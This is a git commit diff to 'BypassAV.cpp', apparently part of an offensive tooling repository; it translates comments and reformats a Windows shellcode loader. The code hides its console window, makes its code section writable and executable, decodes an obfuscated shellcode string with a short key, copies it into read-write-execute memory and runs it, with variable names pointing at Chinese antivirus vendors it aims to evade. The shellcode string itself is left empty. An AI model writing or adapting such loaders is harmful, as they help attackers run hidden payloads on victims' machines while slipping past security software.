27ba380b6b36a40c4962a1e098265c7e0305f167
John Nzyuko <45923438+nzyuko@users.noreply.github.com>
2023-08-15 00:36:35 +0300

    Update BypassAV.cpp

--- shellcode loader/BypassAV/BypassAV.cpp
+++ shellcode loader/BypassAV/BypassAV.cpp
@@ -1,9 +1,8 @@
-#include <stdio.h>
 #include <windows.h>
 #include <iostream>
 #include <string>
-#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")//不显示窗口
-#pragma comment(linker,"/MERGE:.rdata=.text /MERGE:.data=.text /SECTION:.text,EWR")//减小编译体积
+#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"") // Suppress window
+#pragma comment(linker,"/MERGE:.rdata=.text /MERGE:.data=.text /SECTION:.text,EWR") // Reduce compilation size
 
 using namespace std;
 
@@ -31,34 +30,36 @@ privDefer<F> defer_func(F f) {
 #endif
 
 int main() {
-	unsigned char ss[8000];
-	char str[] = "";//此处为加密后的shellcode
-	string str1(str);
-	string passwd1 = str1.substr(0, 10);
-	string Sangfor = str1.substr(10, str1.length());
-	const char* passwd2 = passwd1.data();
-	const char* Shenxinfu = Sangfor.data();
-	int k = 0;
-	for (int i = 0; i < Sangfor.length(); i++)
-	{
-		int len1;
-		len1 = Shenxinfu[i] - 48;
-		string dange = "";
-		for (int j = 0; j < len1; j++)
-		{
-			string a = to_string(Shenxinfu[i + j + 1] - 48);
-			int a1 = passwd1.find(a);
-			string a2 = to_string(a1);
-			dange.append(a2);
-		}
-		i = i + len1;
-		int dange4 = std::stoi(dange);
-		ss[k] = *((char*)&dange4);
-		k = k + 1;
-	}
-	LPVOID Memory = VirtualAlloc(NULL, sizeof(ss), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    	defer(((void(*)())Memory)(););
-    	defer(memcpy(Memory, ss, sizeof(ss)););
-   	defer(if (Memory == NULL) { return 1; });
-   	return 0;
+    unsigned char ss[8000];
+    const char str[] = "";// Encrypted shellcode here
+    string str1(str);
+    string passwd1 = str1.substr(0, 10);
+    string Sangfor = str1.substr(10, str1.length());
+    const char* passwd2 = passwd1.data();
+    const char* Shenxinfu = Sangfor.data();
+    int k = 0;
+
+    for (int i = 0; i < Sangfor.length(); i++) {
+        int len1 = Shenxinfu[i] - '0';
+        string dange = "";
+
+        for (int j = 0; j < len1; j++) {
+            string a = to_string(Shenxinfu[i + j + 1] - '0');
+            int a1 = passwd1.find(a);
+            string a2 = to_string(a1);
+            dange.append(a2);
+        }
+
+        i += len1;
+        int dange4 = stoi(dange);
+        ss[k] = static_cast<char>(dange4);
+        k++;
+    }
+
+    LPVOID Memory = VirtualAlloc(NULL, sizeof(ss), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    defer(((void(*)())Memory)(););
+    defer(memcpy(Memory, ss, sizeof(ss)););
+    defer(if (Memory == NULL) { return 1; });
+    
+    return 0;
 }
